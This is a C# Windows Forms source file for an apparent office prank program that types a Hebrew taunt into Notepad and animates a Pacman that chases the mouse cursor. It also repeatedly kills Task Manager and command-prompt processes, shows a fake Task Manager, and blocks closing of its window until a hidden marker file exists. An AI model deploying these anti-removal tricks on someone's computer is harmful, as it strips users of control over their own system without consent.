using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace YoungsAbuser
{
    public partial class Form1 : Form
    {
        private Point m_pLocPac = new Point(50, 50);
        private bool m_bToContinue = true;
        private bool m_bIsFaking = false;
        private bool m_bKeepAlive = true;
        private int m_nAngry = -1;

        public Form1()
        {
            InitializeComponent();
        }

        public void KeepYourself()
        {
            while (!File.Exists(@"C:\I.AM.YOUNG"))
            {
                if (Process.GetProcessesByName("taskmgr").Length > 0)
                {
                    Process.GetProcessesByName("taskmgr")[0].Kill();
                    //Process.GetProcessesByName("taskmgr")[1].Kill();
                    if (!this.m_bIsFaking)
                    {
                        new Thread(new ThreadStart(this.FakeTaskMGR)).Start();
                        this.m_bIsFaking = true;
                    }
                }

                if (Process.GetProcessesByName("cmd").Length > 0)
                {
                    Process.GetProcessesByName("cmd")[0].Kill();
                    this.m_nAngry = 42;
                }
                Thread.Sleep(100);
            }

            this.m_bKeepAlive = false;
            Application.Exit();
        }

        public void FakeTaskMGR()
        {
            Random r = new Random();
            Image imgDev = YoungsAbuser.Properties.Resources.dispeller;
            ((Bitmap)imgDev).MakeTransparent(Color.White);
            Image imgTask = YoungsAbuser.Properties.Resources.taskmgr1;
            Point pTask = new Point(r.Next(this.Width - imgTask.Width),
                                    r.Next(this.Height - imgTask.Height));
            int t = 0;
            Graphics g = this.CreateGraphics();
            while (t < 1500)
            {
                g.DrawImage(imgTask, pTask);
                t += 100;
                Thread.Sleep(50);
            }

            const int TIMES = 25;
            const int WAIT = 50;
            t = 0;
            Bitmap bmp = new Bitmap(imgTask.Width, imgTask.Height);
            Point pDisp = new Point(r.Next(imgTask.Width - imgDev.Width),
                                    r.Next(imgTask.Height - imgDev.Height));
            while (t < TIMES * WAIT)
            {
                bmp = (Bitmap)imgTask.Clone();
                Graphics.FromImage(bmp).DrawImage(imgDev,
                                                  pDisp.X + r.Next(10),
                                                  pDisp.Y + r.Next(10));
                g.DrawImage(bmp, pTask);
                t += WAIT;
                Thread.Sleep(WAIT);
            }

            this.m_bIsFaking = false;
            Rectangle rect = new Rectangle(pTask, imgTask.Size);
            g.FillRectangle(new SolidBrush(this.TransparencyKey), rect);
        }

        public void MovePacman()
        {
            Image pac1 = YoungsAbuser.Properties.Resources.pac1;
            Image pac2 = YoungsAbuser.Properties.Resources.pac2;
            ((Bitmap)pac1).MakeTransparent(Color.White);
            ((Bitmap)pac2).MakeTransparent(Color.White);
            const int PAC_SPEED = 8;
            const int PAC_WAIT = 35;
            int prev_x = 0, prev_y = 0;
            int t = 0;
            while (this.m_bToContinue)
            {
                while (Math.Sqrt(Math.Pow(MousePosition.X - m_pLocPac.X - pac1.Width / 2, 2) +
                                 Math.Pow(MousePosition.Y - m_pLocPac.Y - pac1.Height / 2, 2)) > PAC_SPEED)
                {
                    Random rand = new Random();
                    Bitmap bmp = new Bitmap(pac1.Width + Math.Abs(prev_x), 
                                            pac1.Height + Math.Abs(prev_y));
                    Graphics bmpGraph = Graphics.FromImage(bmp);
                    bmpGraph.Clear(this.TransparencyKey);
                    double dAngle = Math.Atan2(MousePosition.Y - m_pLocPac.Y - pac1.Height / 2,
                                               MousePosition.X - m_pLocPac.X - pac1.Width / 2);
                    int draw_x = Math.Max(0, prev_x), draw_y = Math.Max(0, prev_y);
                    bmpGraph.TranslateTransform(draw_x + pac1.Width / 2,
                                                draw_y + pac1.Height / 2);
                    bmpGraph.RotateTransform((float)(dAngle * 180 / Math.PI));
                    bmpGraph.TranslateTransform(-pac1.Width / 2, -pac1.Height / 2);
                    bmpGraph.DrawImage(t++ % 2 == 0 ? pac1 : pac2,
                                       new Point(0,
                                                 0));
                    this.CreateGraphics().DrawImage(bmp,
                                new Point(this.m_pLocPac.X - Math.Max(0, prev_x),
                                          this.m_pLocPac.Y - Math.Max(0, prev_y)));
                    if (this.m_nAngry == -1)
                    {
                        prev_x = (int)(PAC_SPEED * Math.Cos(dAngle));
                        prev_y = (int)(PAC_SPEED * Math.Sin(dAngle));
                    }
                    else
                    {
                        double dTempAngle = rand.Next(360) * Math.PI / 180;
                        prev_x = (int)(PAC_SPEED * 2 * Math.Cos(dTempAngle));
                        prev_y = (int)(PAC_SPEED * 2 * Math.Sin(dTempAngle));
                        this.m_nAngry--;
                    }
                    this.m_pLocPac.X += prev_x;
                    this.m_pLocPac.Y += prev_y;
                    Thread.Sleep(PAC_WAIT);
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process.Start("notepad");
            Thread.Sleep(500);
            SendKeys.SendWait("צעירים חצופים! יש לכם שתי אפשרויות:{ENTER}א. לחזור לעבודה!{ENTER}ב. לצלם סרט סיום");
            new Thread(new ThreadStart(this.KeepYourself)).Start();
            Thread.Sleep(15000);
            Thread t = new Thread(new ThreadStart(this.MovePacman));
            t.IsBackground = true;
            t.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //this.m_bToContinue = false;
            if (this.m_bKeepAlive)
            {
                e.Cancel = true;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Bitmap bmp = new Bitmap(100, 100);
            Graphics.FromImage(bmp).Clear(this.TransparencyKey);
            this.CreateGraphics().DrawImage(bmp, 400, 400);
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(this.FakeTaskMGR)).Start();
        }
    }
}
